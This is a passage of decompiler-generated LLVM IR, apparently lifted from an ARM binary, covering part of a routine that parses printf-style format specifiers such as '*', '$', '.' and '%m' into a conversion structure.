  %v0_e688 = phi i32 [ %v5_e60c, %dec_label_pc_e648 ], [ %v0_e580, %bb145 ], [ %v0_e580, %dec_label_pc_e5dc ], [ %v0_e580, %dec_label_pc_e580 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_e648 ], [ %stack_var_-44.1, %bb145 ], [ %stack_var_-44.1, %dec_label_pc_e5dc ], [ %stack_var_-44.1, %dec_label_pc_e580 ]
  %v1_e64c = inttoptr i32 %v0_e688 to i8*
  %v2_e64c = load i8, i8* %v1_e64c, align 1
  %v3_e64c = zext i8 %v2_e64c to i32
  store i32 %v3_e64c, i32* %r3.global-to-local, align 4
  %v7_e650 = icmp eq i8 %v2_e64c, 42
  br i1 %v7_e650, label %dec_label_pc_e658, label %dec_label_pc_e698

dec_label_pc_e658:                                ; preds = %dec_label_pc_e64c
  %v0_e658 = load i32, i32* %fp.global-to-local, align 4
  %v2_e658 = icmp eq i32 %v0_e658, 0
  br i1 %v2_e658, label %dec_label_pc_e688, label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %dec_label_pc_e658
  %v1_e660 = inttoptr i32 %v1_e68c to i8*
  %v2_e660 = load i8, i8* %v1_e660, align 1
  %v3_e660 = zext i8 %v2_e660 to i32
  store i32 %v3_e660, i32* %r3.global-to-local, align 4
  %v7_e664 = icmp eq i8 %v2_e660, 36
  br i1 %v7_e664, label %dec_label_pc_e66c, label %dec_label_pc_e980

dec_label_pc_e66c:                                ; preds = %dec_label_pc_e660
  %v0_e66c = load i32, i32* %r1.global-to-local, align 4
  %tmp146 = icmp slt i32 %v0_e66c, 1
  br i1 %tmp146, label %dec_label_pc_e980, label %dec_label_pc_e674

dec_label_pc_e674:                                ; preds = %dec_label_pc_e66c
  %v0_e678 = load i32, i32* %r8.global-to-local, align 4
  %v1_e678 = load i32, i32* %sb.global-to-local, align 4
  %v3_e678 = mul i32 %v1_e678, %v0_e678
  %v4_e678 = add i32 %v3_e678, %v3_e50c.pre-phi
  store i32 %v4_e678, i32* %r3.global-to-local, align 4
  %v1_e67c = add i32 %v1_e68c, 1
  store i32 %v1_e67c, i32* %r6.global-to-local, align 4
  %v2_e680 = add i32 %v4_e678, -12
  %v3_e680 = inttoptr i32 %v2_e680 to i32*
  store i32 %v0_e66c, i32* %v3_e680, align 4
  br label %dec_label_pc_e694

dec_label_pc_e688:                                ; preds = %dec_label_pc_e658
  %v1_e688 = add i32 %v0_e688, 1
  store i32 %v1_e688, i32* %r3.global-to-local, align 4
  %v9_e68c = icmp eq i32 %v1_e688, %v1_e68c
  br i1 %v9_e68c, label %dec_label_pc_e694, label %dec_label_pc_e980

dec_label_pc_e694:                                ; preds = %dec_label_pc_e688, %dec_label_pc_e674
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e698

dec_label_pc_e698:                                ; preds = %dec_label_pc_e64c, %dec_label_pc_e694
  %v0_e698 = load i32, i32* %r8.global-to-local, align 4
  %v2_e698 = icmp eq i32 %v0_e698, 0
  br i1 %v2_e698, label %dec_label_pc_e6a4, label %dec_label_pc_e6c4.loopexit

dec_label_pc_e6a4:                                ; preds = %dec_label_pc_e698
  %v0_e6a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_e6a4 = inttoptr i32 %v0_e6a4 to i8*
  %v2_e6a4 = load i8, i8* %v1_e6a4, align 1
  %v3_e6a4 = zext i8 %v2_e6a4 to i32
  store i32 %v3_e6a4, i32* %r3.global-to-local, align 4
  %v7_e6a8 = icmp eq i8 %v2_e6a4, 46
  br i1 %v7_e6a8, label %.thread19, label %dec_label_pc_e6bc

.thread19:                                        ; preds = %dec_label_pc_e6a4
  %v2_e6ac = add i32 %v0_e6a4, 1
  store i32 %v2_e6ac, i32* %r6.global-to-local, align 4
  %v1_e6b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e6b0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e500

dec_label_pc_e6bc:                                ; preds = %dec_label_pc_e6a4
  %v0_e6bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e6bc, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_e6c4

dec_label_pc_e6c4.loopexit:                       ; preds = %dec_label_pc_e698
  %v1_e69c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e69c, i32* @r5, align 4
  %v0_e6d0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e6c4

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e6c4.loopexit, %dec_label_pc_e6bc
  %v0_e6d0.pre = phi i32 [ %v0_e6d0.pre.pre, %dec_label_pc_e6c4.loopexit ], [ %v0_e6a4, %dec_label_pc_e6bc ]
  store i32 -37796, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19738.331 to i32), i32* %r1.global-to-local, align 4
  %v1_e6d0 = inttoptr i32 %v0_e6d0.pre to i8*
  br label %dec_label_pc_e6cc

dec_label_pc_e6cc:                                ; preds = %dec_label_pc_e6e0, %dec_label_pc_e6c4
  %v0_e6e0 = phi i32 [ %v1_e6e0, %dec_label_pc_e6e0 ], [ ptrtoint ([9 x i8]* @global_var_19738.331 to i32), %dec_label_pc_e6c4 ]
  %v1_e6cc = inttoptr i32 %v0_e6e0 to i8*
  %v2_e6cc = load i8, i8* %v1_e6cc, align 1
  %v3_e6cc = zext i8 %v2_e6cc to i32
  store i32 %v3_e6cc, i32* %r2.global-to-local, align 4
  %v2_e6d0 = load i8, i8* %v1_e6d0, align 1
  %v3_e6d0 = zext i8 %v2_e6d0 to i32
  store i32 %v3_e6d0, i32* %r3.global-to-local, align 4
  %v9_e6d4 = icmp eq i8 %v2_e6d0, %v2_e6cc
  br i1 %v9_e6d4, label %bb147, label %dec_label_pc_e6e0

bb147:                                            ; preds = %dec_label_pc_e6cc
  %v2_e6d8 = add i32 %v0_e6d0.pre, 1
  store i32 %v2_e6d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e6ec

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e6cc
  %v1_e6e0 = add i32 %v0_e6e0, 1
  %v2_e6e0 = inttoptr i32 %v1_e6e0 to i8*
  %v3_e6e0 = load i8, i8* %v2_e6e0, align 1
  %v4_e6e0 = zext i8 %v3_e6e0 to i32
  store i32 %v4_e6e0, i32* %r3.global-to-local, align 4
  store i32 %v1_e6e0, i32* %r1.global-to-local, align 4
  %v2_e6e4 = icmp eq i8 %v3_e6e0, 0
  br i1 %v2_e6e4, label %dec_label_pc_e6ec, label %dec_label_pc_e6cc

dec_label_pc_e6ec:                                ; preds = %dec_label_pc_e6e0, %bb147
  %v1_e710 = phi i32 [ %v2_e6d8, %bb147 ], [ %v0_e6d0.pre, %dec_label_pc_e6e0 ]
  %v1_e70c = phi i32 [ %v0_e6e0, %bb147 ], [ %v1_e6e0, %dec_label_pc_e6e0 ]
  %v2_e6f4 = sub i32 %v1_e70c, ptrtoint ([9 x i8]* @global_var_19738.331 to i32)
  store i32 %v2_e6f4, i32* %r3.global-to-local, align 4
  %v8_e6fc = icmp sgt i32 %v2_e6f4, 1
  br i1 %v8_e6fc, label %.thread23, label %dec_label_pc_e700

dec_label_pc_e700:                                ; preds = %dec_label_pc_e6ec
  %v1_e700 = inttoptr i32 %v1_e710 to i8*
  %v2_e700 = load i8, i8* %v1_e700, align 1
  %v3_e700 = zext i8 %v2_e700 to i32
  store i32 %v3_e700, i32* %r2.global-to-local, align 4
  %v1_e704 = inttoptr i32 %v1_e70c to i8*
  %v2_e704 = load i8, i8* %v1_e704, align 1
  %v3_e704 = zext i8 %v2_e704 to i32
  store i32 %v3_e704, i32* %r3.global-to-local, align 4
  %v9_e708 = icmp eq i8 %v2_e700, %v2_e704
  br i1 %v9_e708, label %bb148, label %.thread23

bb148:                                            ; preds = %dec_label_pc_e700
  %v2_e70c = add i32 %v1_e70c, 9
  store i32 %v2_e70c, i32* %r1.global-to-local, align 4
  %v2_e710 = add i32 %v1_e710, 1
  store i32 %v2_e710, i32* %r6.global-to-local, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_e700, %dec_label_pc_e6ec, %bb148
  %v0_e718 = phi i32 [ %v1_e70c, %dec_label_pc_e700 ], [ %v1_e70c, %dec_label_pc_e6ec ], [ %v2_e70c, %bb148 ]
  %v0_e714 = phi i32 [ %v1_e710, %dec_label_pc_e700 ], [ %v1_e710, %dec_label_pc_e6ec ], [ %v2_e710, %bb148 ]
  %v1_e714 = inttoptr i32 %v0_e714 to i8*
  %v2_e714 = load i8, i8* %v1_e714, align 1
  %v3_e714 = zext i8 %v2_e714 to i32
  store i32 %v3_e714, i32* %r2.global-to-local, align 4
  %v1_e718 = add i32 %v0_e718, 9
  %v2_e718 = inttoptr i32 %v1_e718 to i8*
  %v3_e718 = load i8, i8* %v2_e718, align 1
  %v4_e718 = zext i8 %v3_e718 to i32
  store i32 %v4_e718, i32* %r3.global-to-local, align 4
  %v2_e71c = icmp eq i8 %v2_e714, 0
  %v3_e720 = mul nuw nsw i32 %v4_e718, 256
  store i32 %v3_e720, i32* @ip, align 4
  br i1 %v2_e71c, label %dec_label_pc_e980, label %dec_label_pc_e728

dec_label_pc_e728:                                ; preds = %.thread23
  store i32 -37696, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1979c.333 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e730

dec_label_pc_e730:                                ; preds = %dec_label_pc_e7b4, %dec_label_pc_e728
  %v1_e744 = phi i32 [ %v1_e7b4, %dec_label_pc_e7b4 ], [ ptrtoint ([21 x i8]* @global_var_1979c.333 to i32), %dec_label_pc_e728 ]
  %v1_e730 = inttoptr i32 %v1_e744 to i8*
  %v2_e730 = load i8, i8* %v1_e730, align 1
  %v3_e730 = zext i8 %v2_e730 to i32
  store i32 %v3_e730, i32* %r3.global-to-local, align 4
  %v9_e734 = icmp eq i8 %v2_e730, %v2_e714
  br i1 %v9_e734, label %dec_label_pc_e73c, label %dec_label_pc_e7b4

dec_label_pc_e73c:                                ; preds = %dec_label_pc_e730
  store i32 ptrtoint ([21 x i8]* @global_var_1979c.333 to i32), i32* %r3.global-to-local, align 4
  %v2_e744 = sub i32 %v1_e744, ptrtoint ([21 x i8]* @global_var_1979c.333 to i32)
  store i32 %v2_e744, i32* %r1.global-to-local, align 4
  %v7_e74c = icmp slt i32 %v2_e744, 18
  br i1 %v7_e74c, label %bb150, label %dec_label_pc_e750

dec_label_pc_e750:                                ; preds = %dec_label_pc_e73c
  %v1_e750 = and i32 %v3_e720, 1024
  %v2_e750 = icmp eq i32 %v1_e750, 0
  br i1 %v2_e750, label %bb150, label %bb149

bb149:                                            ; preds = %dec_label_pc_e750
  %v2_e754 = add i32 %v2_e744, -2
  store i32 %v2_e754, i32* %r1.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %dec_label_pc_e73c, %dec_label_pc_e750, %bb149
  %v0_e75c = phi i32 [ %v2_e744, %dec_label_pc_e73c ], [ %v2_e744, %dec_label_pc_e750 ], [ %v2_e754, %bb149 ]
  %v1_e75c = load i32, i32* %r7.global-to-local, align 4
  %v2_e75c = add i32 %v1_e75c, 32
  %v3_e75c = inttoptr i32 %v2_e75c to i32*
  store i32 %v0_e75c, i32* %v3_e75c, align 4
  store i32 ptrtoint (i32* @global_var_1976c.335 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1976b.336 to i32), i32* %r0.global-to-local, align 4
  %v0_e76c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e768

dec_label_pc_e768:                                ; preds = %dec_label_pc_e768, %bb150
  %v0_e768 = phi i32 [ %v1_e768, %dec_label_pc_e768 ], [ ptrtoint (i32* @global_var_1976b.336 to i32), %bb150 ]
  %v1_e768 = add i32 %v0_e768, 1
  %v2_e768 = inttoptr i32 %v1_e768 to i8*
  %v3_e768 = load i8, i8* %v2_e768, align 1
  %v4_e768 = zext i8 %v3_e768 to i32
  store i32 %v4_e768, i32* %r3.global-to-local, align 4
  store i32 %v1_e768, i32* %r0.global-to-local, align 4
  %v8_e770 = icmp sgt i32 %v0_e76c.pre, %v4_e768
  br i1 %v8_e770, label %dec_label_pc_e768, label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %dec_label_pc_e768
  %v2_e780 = sub i32 %v1_e768, ptrtoint (i32* @global_var_1976c.335 to i32)
  %v2_e784 = mul i32 %v2_e780, 2
  store i32 %v2_e784, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1975c.338 to i32), i32* %r3.global-to-local, align 4
  %v2_e78c = add i32 %v2_e784, ptrtoint (i32* @global_var_1975c.338 to i32)
  %v3_e78c = inttoptr i32 %v2_e78c to i16*
  %v4_e78c = load i16, i16* %v3_e78c, align 2
  %v6_e78c = sext i16 %v4_e78c to i32
  store i32 %v6_e78c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1974c.340 to i32), i32* %r3.global-to-local, align 4
  %v2_e798 = add i32 %v2_e784, ptrtoint (i32* @global_var_1974c.340 to i32)
  %v3_e798 = inttoptr i32 %v2_e798 to i16*
  %v4_e798 = load i16, i16* %v3_e798, align 2
  %v6_e798 = sext i16 %v4_e798 to i32
  %v1_e79c = load i32, i32* @ip, align 4
  %v2_e79c = or i32 %v1_e79c, %v6_e78c
  %v2_e7a0 = and i32 %v2_e79c, %v6_e798
  store i32 %v2_e7a0, i32* %r1.global-to-local, align 4
  store i32 -37696, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1979c.333 to i32), i32* %r0.global-to-local, align 4
  store i32 %v2_e7a0, i32* %stack_var_-72, align 4
  %v0_e7cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e7c0

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e730
  %v1_e7b4 = add i32 %v1_e744, 1
  %v2_e7b4 = inttoptr i32 %v1_e7b4 to i8*
  %v3_e7b4 = load i8, i8* %v2_e7b4, align 1
  %v4_e7b4 = zext i8 %v3_e7b4 to i32
  store i32 %v4_e7b4, i32* %r3.global-to-local, align 4
  store i32 %v1_e7b4, i32* %r0.global-to-local, align 4
  %v2_e7b8 = icmp eq i8 %v3_e7b4, 0
  br i1 %v2_e7b8, label %dec_label_pc_e7c0, label %dec_label_pc_e730

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e7b4, %dec_label_pc_e774
  %v0_e7cc = phi i32 [ %v0_e7cc.pre, %dec_label_pc_e774 ], [ %v0_e714, %dec_label_pc_e7b4 ]
  %v0_e7c8 = phi i32 [ %v1_e79c, %dec_label_pc_e774 ], [ %v3_e720, %dec_label_pc_e7b4 ]
  %v0_e7c0 = load i32, i32* @r4, align 4
  %v1_e7c0 = and i32 %v0_e7c0, 4
  %v1_e7c4 = and i32 %v0_e7c0, -5
  store i32 %v1_e7c4, i32* %r3.global-to-local, align 4
  %v1_e7c8 = and i32 %v0_e7c8, 3840
  store i32 %v1_e7c8, i32* %r2.global-to-local, align 4
  %v1_e7cc = inttoptr i32 %v0_e7cc to i8*
  %v2_e7cc = load i8, i8* %v1_e7cc, align 1
  %v3_e7cc = zext i8 %v2_e7cc to i32
  store i32 %v3_e7cc, i32* %r1.global-to-local, align 4
  %v2_e7d0 = or i32 %v1_e7c4, %v1_e7c8
  store i32 %v2_e7d0, i32* %r2.global-to-local, align 4
  %tmp178 = mul nuw nsw i32 %v1_e7c0, 4
  %tmp179 = or i32 %tmp178, 32
  %v1_e7dc = load i32, i32* %r7.global-to-local, align 4
  %v2_e7dc = add i32 %v1_e7dc, 20
  %v3_e7dc = inttoptr i32 %v2_e7dc to i32*
  store i32 %tmp179, i32* %v3_e7dc, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_e7e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_e7e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_e7e4 = add i32 %v1_e7e4, 12
  %v3_e7e4 = inttoptr i32 %v2_e7e4 to i32*
  store i32 %v0_e7e4, i32* %v3_e7e4, align 4
  %v0_e7e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_e7e8 = add i32 %v0_e7e8, 4
  %v2_e7e8 = inttoptr i32 %v1_e7e8 to i32*
  %v3_e7e8 = load i32, i32* @r5, align 4
  store i32 %v3_e7e8, i32* %v2_e7e8, align 4
  %v4_e7e8 = add i32 %v0_e7e8, 8
  %v5_e7e8 = inttoptr i32 %v4_e7e8 to i32*
  %v6_e7e8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_e7e8, i32* %v5_e7e8, align 4
  %v0_e7ec = load i32, i32* %r2.global-to-local, align 4
  %v1_e7ec = load i32, i32* %r7.global-to-local, align 4
  %v2_e7ec = add i32 %v1_e7ec, 16
  %v3_e7ec = inttoptr i32 %v2_e7ec to i32*
  store i32 %v0_e7ec, i32* %v3_e7ec, align 4
  %v0_e7f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e7f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_e7f0 = add i32 %v1_e7f0, 28
  %v3_e7f0 = inttoptr i32 %v2_e7f0 to i32*
  store i32 %v0_e7f0, i32* %v3_e7f0, align 4
  %v0_e7f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_e7f4 = inttoptr i32 %v0_e7f4 to i8*
  %v2_e7f4 = load i8, i8* %v1_e7f4, align 1
  %v3_e7f4 = zext i8 %v2_e7f4 to i32
  store i32 %v3_e7f4, i32* %r2.global-to-local, align 4
  %v2_e7f8 = icmp eq i8 %v2_e7f4, 0
  br i1 %v2_e7f8, label %dec_label_pc_e800, label %dec_label_pc_e884

dec_label_pc_e800:                                ; preds = %dec_label_pc_e7c0
  %v0_e800 = load i32, i32* %r6.global-to-local, align 4
  %v1_e800 = inttoptr i32 %v0_e800 to i8*
  %v2_e800 = load i8, i8* %v1_e800, align 1
  %v3_e800 = zext i8 %v2_e800 to i32
  store i32 %v3_e800, i32* %r3.global-to-local, align 4
  %v7_e804 = icmp eq i8 %v2_e800, 109
  br i1 %v7_e804, label %.thread27, label %dec_label_pc_e818

.thread27:                                        ; preds = %dec_label_pc_e800
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_e80c = load i32, i32* %r7.global-to-local, align 4
  %v3_e80c = add i32 %v2_e80c, 32
  %v4_e80c = inttoptr i32 %v3_e80c to i32*
  store i32 20, i32* %v4_e80c, align 4
  %v1_e810 = load i32, i32* %r2.global-to-local, align 4
  %v2_e810 = load i32, i32* %r7.global-to-local, align 4
  %v3_e810 = add i32 %v2_e810, 28
  %v4_e810 = inttoptr i32 %v3_e810 to i32*
  store i32 %v1_e810, i32* %v4_e810, align 4
  br label %dec_label_pc_e884

dec_label_pc_e818:                                ; preds = %dec_label_pc_e800
  store i32 656, i32* %r3.global-to-local, align 4
  %v0_e81c = load i32, i32* @lr, align 4
  %v2_e81c = add i32 %v0_e81c, 656
  %v3_e81c = inttoptr i32 %v2_e81c to i32*
  %v4_e81c = load i32, i32* %v3_e81c, align 4
  store i32 %v4_e81c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_e824 = load i32, i32* %r7.global-to-local, align 4
  %v2_e824 = add i32 %v1_e824, 32
  %v3_e824 = inttoptr i32 %v2_e824 to i32*
  store i32 21, i32* %v3_e824, align 4
  %v0_e828 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e828, i32* @ip, align 4
  %v1_e82c = add i32 %v0_e828, 10
  store i32 %v1_e82c, i32* %r0.global-to-local, align 4
  %v0_e834.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_e834 = inttoptr i32 %v0_e834.pre to i8*
  br label %dec_label_pc_e830

dec_label_pc_e830:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e818
  %v1_e840 = phi i32 [ %v1_e874, %dec_label_pc_e874 ], [ %v0_e828, %dec_label_pc_e818 ]
  %v1_e830 = inttoptr i32 %v1_e840 to i8*
  %v2_e830 = load i8, i8* %v1_e830, align 1
  %v3_e830 = zext i8 %v2_e830 to i32
  store i32 %v3_e830, i32* %r2.global-to-local, align 4
  %v2_e834 = load i8, i8* %v1_e834, align 1
  %v3_e834 = zext i8 %v2_e834 to i32
  store i32 %v3_e834, i32* %r3.global-to-local, align 4
  %v9_e838 = icmp eq i8 %v2_e830, %v2_e834
  br i1 %v9_e838, label %dec_label_pc_e840, label %dec_label_pc_e874

dec_label_pc_e840:                                ; preds = %dec_label_pc_e830
  %v2_e840 = sub i32 %v1_e840, %v0_e828
  store i32 %v2_e840, i32* %r3.global-to-local, align 4
  %v0_e848 = load i32, i32* %r7.global-to-local, align 4
  %v1_e848 = add i32 %v0_e848, 4
  store i32 %v1_e848, i32* %r0.global-to-local, align 4
  %v0_e84c = load i32, i32* @lr, align 4
  %v2_e84c = add i32 %v0_e84c, 11332
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_e854 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_e854, i32* %r2.global-to-local, align 4
  %v4_e858 = mul i32 %v2_e840, 4
  %v5_e858 = add i32 %v2_e84c, %v4_e858
  %v6_e858 = inttoptr i32 %v5_e858 to i32*
  %v7_e858 = load i32, i32* %v6_e858, align 4
  store i32 %v7_e858, i32* @ip, align 4
  store i32 59492, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_e858)
  %v0_e864 = load i32, i32* %r0.global-to-local, align 4
  %v1_e868 = load i32, i32* %r7.global-to-local, align 4
  %v2_e868 = add i32 %v1_e868, 28
  %v3_e868 = inttoptr i32 %v2_e868 to i32*
  store i32 %v0_e864, i32* %v3_e868, align 4
  %v7_e86c = icmp sgt i32 %v0_e864, 5
  br i1 %v7_e86c, label %dec_label_pc_e980, label %dec_label_pc_e884

dec_label_pc_e874:                                ; preds = %dec_label_pc_e830
  %v1_e874 = add i32 %v1_e840, 1
  store i32 %v1_e874, i32* %r1.global-to-local, align 4
  %v3_e878 = icmp ult i32 %v1_e874, %v1_e82c
  br i1 %v3_e878, label %dec_label_pc_e830, label %dec_label_pc_e980

dec_label_pc_e884:                                ; preds = %.thread27, %dec_label_pc_e840, %dec_label_pc_e7c0
  %v0_e884 = load i32, i32* %fp.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_e884, 1
  br i1 %tmp154, label %dec_label_pc_e930, label %dec_label_pc_e88c

dec_label_pc_e88c:                                ; preds = %dec_label_pc_e884
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_e8a4 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_e890

dec_label_pc_e890:                                ; preds = %dec_label_pc_e918, %dec_label_pc_e88c
  %v9_e8b0 = phi i32 [ 0, %dec_label_pc_e88c ], [ %v1_e91c, %dec_label_pc_e918 ]
  %v7_e894 = icmp sgt i32 %v9_e8b0, 2
  br i1 %v7_e894, label %.thread37, label %bb155

.thread37:                                        ; preds = %dec_label_pc_e890
  store i32 %v9_e8a4, i32* %r3.global-to-local, align 4
  %v10_e8b0 = add i32 %v9_e8b0, %v9_e8a4
  store i32 %v10_e8b0, i32* %r1.global-to-local, align 4
  br label %bb156

bb155:                                            ; preds = %dec_label_pc_e890
  store i32 %v3_e50c.pre-phi, i32* @ip, align 4
  %v12_e898 = mul i32 %v9_e8b0, 4
  %v13_e898 = add i32 %v12_e898, %v3_e50c.pre-phi
  store i32 %v13_e898, i32* %r3.global-to-local, align 4
  %v9_e8a0 = add i32 %v13_e898, -12
  %v10_e8a0 = inttoptr i32 %v9_e8a0 to i8*
  %v11_e8a0 = load i8, i8* %v10_e8a0, align 4
  %v12_e8a0 = zext i8 %v11_e8a0 to i32
  store i32 %v12_e8a0, i32* %r2.global-to-local, align 4
  %v9_e8a8 = load i32, i32* %r7.global-to-local, align 4
  %v10_e8a8 = add i32 %v9_e8a8, %v9_e8b0
  store i32 %v10_e8a8, i32* %r3.global-to-local, align 4
  store i32 %v12_e8a0, i32* %r1.global-to-local, align 4
  %v11_e8b4 = add i32 %v10_e8a8, 36
  %v12_e8b4 = inttoptr i32 %v11_e8b4 to i8*
  store i8 %v11_e8a0, i8* %v12_e8b4, align 1
  %v0_e8b8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %.thread37, %bb155
  %v0_e8d8 = phi i32 [ %v10_e8b0, %.thread37 ], [ %v0_e8b8.pre, %bb155 ]
  %v1_e8b8 = load i32, i32* %fp.global-to-local, align 4
  %v2_e8b8 = sub i32 %v0_e8d8, %v1_e8b8
  %v4_e8b8 = xor i32 %v1_e8b8, %v0_e8d8
  %v5_e8b8 = xor i32 %v2_e8b8, %v0_e8d8
  %v6_e8b8 = and i32 %v5_e8b8, %v4_e8b8
  %v7_e8b8 = icmp slt i32 %v6_e8b8, 0
  %v8_e8b8 = icmp slt i32 %v2_e8b8, 0
  %v9_e8b8 = icmp eq i32 %v0_e8d8, %v1_e8b8
  %v3_e8bc = xor i1 %v8_e8b8, %v7_e8b8
  %v4_e8bc = or i1 %v9_e8b8, %v3_e8bc
  br i1 %v4_e8bc, label %dec_label_pc_e8cc, label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %bb156
  %v1_e8c0 = add i32 %v0_e8d8, -9
  %v3_e8c0 = sub i32 8, %v0_e8d8
  %v4_e8c0 = and i32 %v3_e8c0, %v0_e8d8
  %v5_e8c0 = icmp slt i32 %v4_e8c0, 0
  %v6_e8c0 = icmp slt i32 %v1_e8c0, 0
  %v7_e8c0 = icmp eq i32 %v0_e8d8, 9
  %v3_e8c4 = xor i1 %v6_e8c0, %v5_e8c0
  %v4_e8c4 = or i1 %v7_e8c0, %v3_e8c4
  br i1 %v4_e8c4, label %dec_label_pc_e8c8, label %dec_label_pc_e980

dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e8c0
  store i32 %v0_e8d8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_e8cc

dec_label_pc_e8cc:                                ; preds = %bb156, %dec_label_pc_e8c8
  store i32 %v3_e50c.pre-phi, i32* @r2, align 4
  %v1_e8d0 = load i32, i32* %r8.global-to-local, align 4
  %v4_e8d0 = mul i32 %v1_e8d0, 4
  %v5_e8d0 = add i32 %v4_e8d0, %v3_e50c.pre-phi
  store i32 %v5_e8d0, i32* %sb.global-to-local, align 4
  %v1_e8d4 = add i32 %v5_e8d0, -40
  %v2_e8d4 = inttoptr i32 %v1_e8d4 to i32*
  %v3_e8d4 = load i32, i32* %v2_e8d4, align 4
  store i32 %v3_e8d4, i32* %r5.global-to-local, align 4
  %v1_e8d8 = add i32 %v0_e8d8, -1
  store i32 %v1_e8d8, i32* %r3.global-to-local, align 4
  %v0_e8dc = load i32, i32* %r7.global-to-local, align 4
  %v4_e8dc = mul i32 %v1_e8d8, 4
  %v5_e8dc = add i32 %v0_e8dc, %v4_e8dc
  store i32 %v5_e8dc, i32* %sl.global-to-local, align 4
  %v7_e8e0 = icmp eq i32 %v3_e8d4, 8
  %v1_e8e4 = add i32 %v5_e8dc, 40
  %v2_e8e4 = inttoptr i32 %v1_e8e4 to i32*
  %v3_e8e4 = load i32, i32* %v2_e8e4, align 4
  store i32 %v3_e8e4, i32* @r0, align 4
  br i1 %v7_e8e0, label %dec_label_pc_e918, label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e8cc
  %v9_e8ec = icmp eq i32 %v3_e8e4, %v3_e8d4
  br i1 %v9_e8ec, label %dec_label_pc_e910, label %bb157

bb157:                                            ; preds = %dec_label_pc_e8ec
  %v8_e8f0 = icmp eq i32 %v3_e8e4, 8
  br i1 %v8_e8f0, label %dec_label_pc_e910, label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %bb157
  %v0_e8f8 = call i32 @function_e3fc()
  %v0_e900 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e900, i32* @r0, align 4
  %v0_e904 = call i32 @function_e3fc()
  store i32 %v0_e904, i32* %r0.global-to-local, align 4
  %v8_e90c = icmp sgt i32 %v0_e8f8, %v0_e904
  br i1 %v8_e90c, label %dec_label_pc_e918, label %dec_label_pc_e8f8.dec_label_pc_e910_crit_edge

dec_label_pc_e8f8.dec_label_pc_e910_crit_edge:    ; preds = %dec_label_pc_e8f8
  %v0_e910.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_e914.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %dec_label_pc_e8f8.dec_label_pc_e910_crit_edge, %dec_label_pc_e8ec, %bb157
  %v1_e914 = phi i32 [ %v1_e914.pre, %dec_label_pc_e8f8.dec_label_pc_e910_crit_edge ], [ %v5_e8dc, %dec_label_pc_e8ec ], [ %v5_e8dc, %bb157 ]
  %v0_e910 = phi i32 [ %v0_e910.pre, %dec_label_pc_e8f8.dec_label_pc_e910_crit_edge ], [ %v5_e8d0, %dec_label_pc_e8ec ], [ %v5_e8d0, %bb157 ]
  %v1_e910 = add i32 %v0_e910, -40
  %v2_e910 = inttoptr i32 %v1_e910 to i32*
  %v3_e910 = load i32, i32* %v2_e910, align 4
  store i32 %v3_e910, i32* %r3.global-to-local, align 4
  %v2_e914 = add i32 %v1_e914, 40
  %v3_e914 = inttoptr i32 %v2_e914 to i32*
  store i32 %v3_e910, i32* %v3_e914, align 4
  br label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %dec_label_pc_e8f8, %dec_label_pc_e8cc, %dec_label_pc_e910
  %v0_e918 = load i32, i32* %r7.global-to-local, align 4
